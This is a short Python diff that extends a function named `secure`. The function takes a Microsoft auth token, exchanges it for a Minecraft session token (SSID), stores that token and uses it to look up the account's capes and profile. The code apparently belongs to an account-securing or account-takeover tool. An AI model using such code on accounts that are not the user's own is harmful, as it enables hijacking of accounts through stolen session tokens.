@@ -1,5 +1,9 @@
 from views.utils.getCookies import getCookies
 from views.utils.polishHost import polishHost
+from views.utils.getProfile import getProfile
+from views.utils.getMethod import getMethod
+from views.utils.getCapes import getCapes
+from views.utils.getSSID import getSSID
 from views.utils.getXBL import getXBL
 
 def secure(msaauth: str):
@@ -48,3 +52,31 @@ def secure(msaauth: str):
     
     print("[~] - Checking Minecraft Account")
     XBLResponse = getXBL(host)
+    
+    xbl = XBLResponse["xbl"]
+    ssid =  getSSID(xbl)
+
+    if ssid:
+        print("[+] - Got SSID!")
+        accountInfo["SSID"] = ssid
+
+        # Might replace with a non ssid request (uuid based)
+        capes = getCapes(ssid)
+        if capes:
+            accountInfo["capes"] = ", ".join(i["alias"] for i in capes)
+        else:
+            accountInfo["capes"] = "No Capes"
+        
+        profile = getProfile(ssid)
+        if not profile:
+            accountInfo["oldName"] = "No Minecraft"
+            print("[x] - Failed to get profile")
+        else:
+            print(f"[+] - Got profile")
+            accountInfo["oldName"] = profile
+
+        method = getMethod(ssid)
+            
+        
+
+        
